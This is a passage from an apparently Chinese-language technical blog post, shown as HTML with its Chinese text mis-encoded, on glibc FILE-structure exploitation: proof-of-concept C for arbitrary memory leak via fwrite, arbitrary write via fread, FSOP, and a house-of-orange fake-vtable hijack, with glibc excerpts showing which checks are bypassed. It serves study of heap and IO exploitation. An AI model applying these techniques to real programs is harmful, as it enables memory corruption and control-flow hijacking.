//é‡Šæ”¾å¯¹ä¸Šå ç”¨çš„å†…å­˜</span><br><span class="line">			-&gt;_IO_un_link	//ç¬¬ä¸‰æ¬¡è°ƒç”¨</span><br></pre></td></tr></table></figure>



<h2 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h2><h3 id="æ³„éœ²"><a href="#æ³„éœ²" class="headerlink" title="æ³„éœ²"></a>æ³„éœ²</h3><p>ç¯¡æ”¹fpçš„å†™ç¼“å†²åŒºæŒ‡é’ˆæŒ‡å‘éœ€è¦æ³„éœ²çš„åœ°å€, å¹¶ç¯¡æ”¹fpçš„æ–‡ä»¶æè¿°ç¬¦ä¸ºæ ‡å‡†è¾“å‡º, è§¦å‘ä¸€ä¸ªç¼“å†²åŒºåˆ·æ–°, å³å¯æ‰“å°æ³„éœ²</p>
<blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span> <span class="title function_">fwrite</span><span class="params">(<span class="type">const</span> <span class="type">void</span> *ptr, <span class="type">size_t</span> size, <span class="type">size_t</span> nmemb, FILE *stream)</span></span><br></pre></td></tr></table></figure>

<p>æŠŠ <strong>ptr</strong> æ‰€æŒ‡å‘çš„æ•°ç»„ä¸­çš„æ•°æ®å†™å…¥åˆ°ç»™å®šæµ <strong>stream</strong> ä¸­ã€‚</p>
<p>å†™å…¥<code>size</code>å¤§å°çš„å•ä½<code>nmemb</code>ä¸ª</p>
</blockquote>
<p>å†™ä¸€ä¸ª<code>poc</code>æ„æ€æ„æ€</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> secret[]=<span class="string">&quot;this is a secret&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;flag @ %p\n&quot;</span>,secret);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">0x100</span>];</span><br><span class="line">    FILE *fp;</span><br><span class="line">    fp = fopen(<span class="string">&quot;./flag&quot;</span>, <span class="string">&quot;w&quot;</span>);		<span class="comment">// unset _IO_NO_WRITES to bypass checks in _IO_file_overflow</span></span><br><span class="line">    fp-&gt;_flags = <span class="number">0x800</span>; 			<span class="comment">//IO_CURRENTLY_PUTTING bypass checks in _IO_file_overflow</span></span><br><span class="line">    fp-&gt;_IO_write_base = secret;	<span class="comment">//points to address that we want to leak</span></span><br><span class="line">    fp-&gt;_IO_read_end = secret;      <span class="comment">//IO_read_end must equals to write_base to bypass checks in new_do_write</span></span><br><span class="line">    fp-&gt;_IO_write_ptr = secret + <span class="keyword">sizeof</span>(secret);	<span class="comment">//ptr - base contains our flag to leak</span></span><br><span class="line">    fp-&gt;_fileno = <span class="number">1</span>;               	<span class="comment">//redirect to stdout</span></span><br><span class="line"></span><br><span class="line">    fwrite(buffer,<span class="number">0x100</span>,<span class="number">0x1</span>,fp);    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å‡è®¾æˆ‘ä»¬èƒ½å¤Ÿæ§åˆ¶<code>fp</code>æŒ‡å‘çš„<code>FILE</code>ç»“æ„,å¹¶èƒ½æ”¹å†™å…¶æˆå‘˜</p>
<p>æˆ‘ä»¬å¸Œæœ›é€šè¿‡è®¾ç½®<code>fp-&gt;_IO_write_base = secret;</code>è§¦å‘è°ƒç”¨é“¾</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">fwrite</span><br><span class="line">	_IO_sputn =&gt; _IO_file_xsputn</span><br><span class="line">		_IO_OVERFLOW =&gt; _IO_file_overflow</span><br><span class="line">			=&gt; _IO_new_do_write</span><br><span class="line">				=&gt; new_do_write</span><br><span class="line">					=&gt; _IO_file_write</span><br><span class="line">						=&gt; __write</span><br></pre></td></tr></table></figure>

<p>ä»è€Œæ‰“å°<code>secret</code>ä¸Šçš„å­—ç¬¦ä¸²</p>
<p>ä¸ºäº†å®ç°è¿™ä¸€ç›®çš„,è¿˜éœ€è¦è®¾ç½®<code>FILE</code>çš„å‡ ä¸ªå‚æ•°</p>
<h4 id="1-fp-fopen-flag-w"><a href="#1-fp-fopen-flag-w" class="headerlink" title="-1.fp = fopen(&quot;./flag&quot;, &quot;w&quot;);	"></a>-1.<code>fp = fopen(&quot;./flag&quot;, &quot;w&quot;);	</code></h4><p>è¿™ä¸ª<code>fp</code>è¦ä¹ˆä»¥<code>w</code>æ‰“å¼€,è¦ä¹ˆæ‰‹åŠ¨è®¾ç½®å…¶<code>flag |= ~0x8</code></p>
<p>æ€»ä¹‹ä¸èƒ½æœ‰<code>_IO_NO_WRITES</code>, è¿™æ˜¯å› ä¸º<code>_IO_file_overflow</code>æœ€å¼€å§‹ä¼šæ£€æŸ¥è¯¥æ ‡å¿—, é˜²æ­¢å¯¹ä¸å¯å†™çš„æ–‡ä»¶è¿›è¡Œå†™å…¥æ“ä½œ</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">_IO_new_file_overflow (FILE *f, <span class="type">int</span> ch)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES) <span class="comment">/* SET ERROR */</span></span><br><span class="line">    &#123;</span><br><span class="line">      f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>



<h4 id="0-fp-IO-write-base-secret"><a href="#0-fp-IO-write-base-secret" class="headerlink" title="0.fp-&gt;_IO_write_base = secret;"></a>0.<code>fp-&gt;_IO_write_base = secret;</code></h4><p>æœ€å…³é”®çš„ä¸€æ¡,è¦æ³„éœ²çš„åœ°å€</p>
<h4 id="1-fp-IO-write-ptr-secret-sizeof-secret"><a href="#1-fp-IO-write-ptr-secret-sizeof-secret" class="headerlink" title="1.fp-&gt;_IO_write_ptr = secret + sizeof(secret);"></a>1.<code>fp-&gt;_IO_write_ptr = secret + sizeof(secret);</code></h4><p>ä¸0ç´§å¯†é…åˆ,<code>_IO_OVERFLOW</code>ä¼šå°†ä½äº<code>write_base</code>å’Œ<code>write_ptr</code>ä¹‹é—´çš„å†…å®¹åˆ·æ–°åˆ°ç¼“å†²åŒº</p>
<p>è¦ä¿è¯ä¸¤è€…ä¹‹é—´çš„è·ç¦»å¤§äºflagé•¿åº¦</p>
<h4 id="3-fp-flags-0x800"><a href="#3-fp-flags-0x800" class="headerlink" title="3.fp-&gt;_flags = 0x800;"></a>3.<code>fp-&gt;_flags = 0x800;</code></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fp-&gt;_flags = 0x800; //IO_CURRENTLY_PUTTING</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œæ˜¯å› ä¸ºåœ¨å‡½æ•°<code>_IO_file_overflow</code>ä¸­,å¦‚æœä¸è®¾ç½®è¯¥æ ‡å¿—ä¼šè¿›å…¥ä¸€ä¸ªæ¡ä»¶åˆ†æ”¯,ä¿®æ”¹æˆ‘ä»¬é¢„è®¾çš„<code>_IO_write_base </code>ç­‰ä¸€ç³»åˆ—æŒ‡é’ˆ</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//_IO_new_file_overflow</span></span><br><span class="line"><span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="number">0</span> || f-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* Allocate a buffer if needed. */</span></span><br><span class="line">    <span class="keyword">if</span> (f-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        _IO_doallocbuf(f);</span><br><span class="line">        _IO_setg(f, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* Otherwise must be currently reading.</span></span><br><span class="line"><span class="comment">   If _IO_read_ptr (and hence also _IO_read_end) is at the buffer end,</span></span><br><span class="line"><span class="comment">   logically slide the buffer forwards one block (by setting the</span></span><br><span class="line"><span class="comment">   read pointers to all point at the beginning of the block).  This</span></span><br><span class="line"><span class="comment">   makes room for subsequent output.</span></span><br><span class="line"><span class="comment">   Otherwise, set the read pointers to _IO_read_end (leaving that</span></span><br><span class="line"><span class="comment">   alone, so it can continue to correspond to the external position). */</span></span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely(_IO_in_backup(f)))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">size_t</span> nbackup = f-&gt;_IO_read_end - f-&gt;_IO_read_ptr;</span><br><span class="line">        _IO_free_backup_area(f);</span><br><span class="line">        f-&gt;_IO_read_base -= MIN(nbackup,</span><br><span class="line">                                f-&gt;_IO_read_base - f-&gt;_IO_buf_base);</span><br><span class="line">        f-&gt;_IO_read_ptr = f-&gt;_IO_read_base;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (f-&gt;_IO_read_ptr == f-&gt;_IO_buf_end)</span><br><span class="line">        f-&gt;_IO_read_end = f-&gt;_IO_read_ptr = f-&gt;_IO_buf_base;</span><br><span class="line">    f-&gt;_IO_write_ptr = f-&gt;_IO_read_ptr;</span><br><span class="line">    f-&gt;_IO_write_base = f-&gt;_IO_write_ptr;</span><br><span class="line">    f-&gt;_IO_write_end = f-&gt;_IO_buf_end;</span><br><span class="line">    f-&gt;_IO_read_base = f-&gt;_IO_read_ptr = f-&gt;_IO_read_end;</span><br><span class="line"></span><br><span class="line">    f-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">    <span class="keyword">if</span> (f-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; f-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))</span><br><span class="line">        f-&gt;_IO_write_end = f-&gt;_IO_write_ptr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="4-fp-IO-read-end-secret"><a href="#4-fp-IO-read-end-secret" class="headerlink" title="4.fp-&gt;_IO_read_end = secret; "></a>4.<code>fp-&gt;_IO_read_end = secret; </code></h4><p>è¿™æ¡æ˜¯ä¸ºäº†ç»•è¿‡<code>new_do_write</code>ä¸­çš„æ£€æŸ¥,</p>
<p>è¦ä¹ˆ<code>_flags</code>ä¸­æœ‰<code>_IO_IS_APPENDING(0x1000)</code>æ ‡å¿—,</p>
<p>è¦ä¹ˆ<code>fp-&gt;_IO_read_end == fp-&gt;_IO_write_base</code></p>
<p>æ‰èƒ½é¿å…<code>_IO_SYSSEEK</code>çš„è°ƒç”¨,å› ä¸º<code>_IO_SYSSEEK</code>è°ƒç”¨å<code>new_pos == _IO_pos_BA</code>,æ¥ä¸‹æ¥å°±è¿”å›äº†</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//new_do_write</span></span><br><span class="line"><span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_IS_APPENDING)</span><br><span class="line">    fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">off64_t</span> new_pos = _IO_SYSSEEK(fp, fp-&gt;_IO_write_base - fp-&gt;_IO_read_end, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (new_pos == _IO_pos_BAD)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    fp-&gt;_offset = new_pos;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å› æ­¤å°†<code>flags</code>ç½®ä½<code>_IO_IS_APPENDING</code>ä¹Ÿå¯ä»¥</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fp-&gt;_flags = <span class="number">0x800</span> | <span class="number">0x1000</span>;</span><br></pre></td></tr></table></figure>



<h4 id="FSOPæ–¹æ³•"><a href="#FSOPæ–¹æ³•" class="headerlink" title="FSOPæ–¹æ³•"></a>FSOPæ–¹æ³•</h4><p>å¦‚æœæ²¡æœ‰fwriteè°ƒç”¨,ä¹Ÿå¯ä»¥è€ƒè™‘åˆ©ç”¨FSOPæ–¹æ³•</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> secret[]=<span class="string">&quot;flag&#123;dustball&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;flag @ %p\n&quot;</span>,secret);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">0x100</span>];</span><br><span class="line">    FILE *fp;</span><br><span class="line">    fp = fopen(<span class="string">&quot;./flag&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">    fp-&gt;_flags = <span class="number">0x800</span> | <span class="number">0x1000</span>; <span class="comment">//IO_CURRENTLY_PUTTING</span></span><br><span class="line">    fp-&gt;_IO_write_base = secret;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// fp-&gt;_IO_read_end = secret;      //IO_read_end must equals to write_base to overpass check in</span></span><br><span class="line">    fp-&gt;_IO_write_ptr = secret + <span class="keyword">sizeof</span>(secret);</span><br><span class="line">    fp-&gt;_fileno = <span class="number">1</span>;                  <span class="comment">//stdout</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//no fwrite , however fp is linked to _IO_list_all, use FSOP</span></span><br><span class="line">    <span class="comment">// fwrite(buffer,0x100,0x1,fp);     </span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="ä»»æ„åœ°å€å†™"><a href="#ä»»æ„åœ°å€å†™" class="headerlink" title="ä»»æ„åœ°å€å†™"></a>ä»»æ„åœ°å€å†™</h3><p>å†™ä¸ªpocæ„æ€æ„æ€</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> key = <span class="number">0x12345678</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">  FILE *fp;</span><br><span class="line">  <span class="type">char</span> buffer[<span class="number">100</span>];</span><br><span class="line"></span><br><span class="line">  fp = fopen(<span class="string">&quot;./flag&quot;</span>,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="comment">//fp -&gt; _flagsä¸èƒ½æœ‰IO_NO_READS,ä¹Ÿä¸èƒ½æœ‰_IO_EOF_SEEN</span></span><br><span class="line">  fp -&gt; _IO_read_ptr = <span class="number">0</span>;</span><br><span class="line">  fp -&gt; _IO_read_end = <span class="number">0</span>;</span><br><span class="line">  fp -&gt; _IO_buf_base = &amp;key;</span><br><span class="line">  fp -&gt; _IO_buf_end = &amp;key + <span class="number">4</span>;</span><br><span class="line">  fp -&gt; _fileno = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">  fread(buffer,<span class="number">1</span>,<span class="number">4</span>,fp);             <span class="comment">//æ–¹å‘fp -&gt; _IO_buf_base</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>,key);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å‡è®¾æˆ‘ä»¬èƒ½å¤Ÿæ§åˆ¶<code>fp</code>æŒ‡å‘çš„<code>FILE</code>ç»“æ„,å¹¶èƒ½æ”¹å†™å…¶æˆå‘˜</p>
<p>æˆ‘ä»¬å¸Œæœ›é€šè¿‡è®¾ç½®<code>fp-&gt;_IO_buf_base = target_addr;</code>è§¦å‘è°ƒç”¨é“¾</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">fread</span><br><span class="line">	_IO_sgetn =&gt; _IO_file_xsgetn</span><br><span class="line">		__underflow</span><br><span class="line">			_IO_UNDERFLOW =&gt; _IO_file_underflow</span><br><span class="line">				_IO_SYSREAD =&gt; _IO_file_read</span><br><span class="line">					__read</span><br></pre></td></tr></table></figure>

<p>ä»è€Œå®ç°å¾€<code>target_addr</code>å†™å…¥ä»»æ„æ•°æ®</p>
<p>ä¸ºäº†å®ç°è¿™ä¸€ç›®çš„ï¼Œè¿˜éœ€è¦è®¾ç½®fpçš„å…¶ä»–å‚æ•°</p>
<h4 id="1-fp-fopen-flag-r"><a href="#1-fp-fopen-flag-r" class="headerlink" title="-1.fp = fopen(&quot;./flag&quot;,&quot;r&quot;);"></a>-1.<code>fp = fopen(&quot;./flag&quot;,&quot;r&quot;);</code></h4><p><code>fp </code>å¿…é¡»æ˜¯æœ‰è¯»æƒé™çš„ï¼Œæˆ–è€…æ‰‹åŠ¨è®¾ç½®<code>flag</code>ï¼Œä¸èƒ½æœ‰<code>IO_NO_READS(0x4)</code>æ ‡å¿—</p>
<p>åŒæ—¶ä¸èƒ½æœ‰<code>_IO_EOF_SEEN(0x10)</code></p>
<p>è¿™æ˜¯å› ä¸º<code>_IO_file_underflow</code>ä¼šå¯¹flagè¿›è¡Œæ£€æŸ¥</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_new_file_underflow (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">ssize_t</span> count;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* C99 requires EOF to be &quot;sticky&quot;.  */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_EOF_SEEN)</span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_READS)</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h4 id="0-fp-IO-buf-base-key"><a href="#0-fp-IO-buf-base-key" class="headerlink" title="0.fp -&gt; _IO_buf_base = &amp;key;"></a>0.<code>fp -&gt; _IO_buf_base = &amp;key;</code></h4><p>ä»»æ„åœ°å€å†™çš„å…³é”®</p>
<h4 id="1-fp-IO-buf-end-key-4"><a href="#1-fp-IO-buf-end-key-4" class="headerlink" title="1.fp -&gt; _IO_buf_end = &amp;key + 4;"></a>1.<code>fp -&gt; _IO_buf_end = &amp;key + 4;</code></h4><p>é…åˆ0,å¿…é¡»ä¿è¯endå’Œbaseä¹‹é—´çš„è·ç¦»è¦å¤§äºfreadå†™å…¥çš„é•¿åº¦,</p>
<p>è¿™æ˜¯å› ä¸º<code>_IO_file_xsgetn</code>ä¸­ä¼šæ£€æŸ¥è¿™ä¸€ç‚¹</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (want &gt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">  have = fp-&gt;_IO_read_end - fp-&gt;_IO_read_ptr;</span><br><span class="line">  <span class="keyword">if</span> (want &lt;= have)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memcpy</span>(s, fp-&gt;_IO_read_ptr, want);</span><br><span class="line">    fp-&gt;_IO_read_ptr += want;</span><br><span class="line">    want = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> (have &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      s = __mempcpy(s, fp-&gt;_IO_read_ptr, have);</span><br><span class="line">      want -= have;</span><br><span class="line">      fp-&gt;_IO_read_ptr += have;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h4 id="2-fp-IO-read-ptr-0-fp-IO-read-end-0"><a href="#2-fp-IO-read-ptr-0-fp-IO-read-end-0" class="headerlink" title="2.fp -&gt; _IO_read_ptr = 0; &amp;&amp; fp -&gt; _IO_read_end = 0;"></a>2.<code>fp -&gt; _IO_read_ptr = 0; &amp;&amp; fp -&gt; _IO_read_end = 0;</code></h4><p>è¿™æ˜¯å› ä¸ºåœ¨<code>_IO_file_underflow</code>ä¸­ä¼šæ£€æŸ¥ä¸¤è€…æ˜¯å¦ç›¸ç­‰</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)</span><br><span class="line">  <span class="keyword">return</span> *(<span class="type">unsigned</span> <span class="type">char</span> *) fp-&gt;_IO_read_ptr;</span><br></pre></td></tr></table></figure>



<h4 id="3-fp-fileno-0"><a href="#3-fp-fileno-0" class="headerlink" title="3.fp -&gt; _fileno = 0;"></a>3.<code>fp -&gt; _fileno = 0;</code></h4><p>ç»™äºˆæˆ‘ä»¬ä»æ ‡å‡†è¾“å…¥è·å–ä»»æ„å­—ç¬¦åˆ°ç›®æ ‡åœ°å€çš„æƒåˆ©</p>
<h3 id="house-of-orange-glibc"><a href="#house-of-orange-glibc" class="headerlink" title="[house of orange @ glibc &lt;&#x3D; 2.23]"></a>[house of orange @ glibc &lt;&#x3D; 2.23]</h3><p>é€šè¿‡å †åˆ©ç”¨æ‰‹æ®µï¼Œæ§åˆ¶å †ä¸Šçš„<code>FILE</code>ç»“æ„ä½“ï¼Œèƒ½å¤Ÿä¿®æ”¹<code>vtable</code>æŒ‡é’ˆï¼Œå…·ä½“æ€ä¹ˆå †åˆ©ç”¨ï¼Œè¿™ä¸é‡è¦</p>
<p>é‡è¦çš„æ˜¯æŠŠ<code>vtable</code>æŒ‡é’ˆä¿®æ”¹ä¸ºæ„é€ çš„å‡è¡¨ä¸­</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">win</span><span class="params">()</span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;function win called\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">  FILE *fp;</span><br><span class="line">  <span class="type">size_t</span> *fake_vtable;</span><br><span class="line">  <span class="type">size_t</span> *vtable_ptr;</span><br><span class="line">  <span class="type">size_t</span> *vtable_addr;</span><br><span class="line"></span><br><span class="line">  fake_vtable = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;fake_vtable @ %p\n&quot;</span>, fake_vtable);</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">20</span>;i++)&#123; <span class="comment">// æˆ‘ä»Šå¤©å°±æ˜¯è¦æŠŠè¿™å‡è¡¨ç‹ ç‹ å¡æ»¡</span></span><br><span class="line">    fake_vtable[i] = (<span class="type">size_t</span>)win;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  fp = fopen(<span class="string">&quot;./flag&quot;</span>,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;fp @ %p\n&quot;</span>, fp);    </span><br><span class="line"></span><br><span class="line">  <span class="comment">//_IO_FILE_plusä¸­vtableæŒ‡é’ˆçš„åç§»åœ°å€ä¸º0xd8</span></span><br><span class="line">  vtable_ptr  = (<span class="type">char</span>*)fp + <span class="number">0xd8</span>;   </span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;vtable_ptr = %p\n&quot;</span>, vtable_ptr);</span><br><span class="line"></span><br><span class="line">  <span 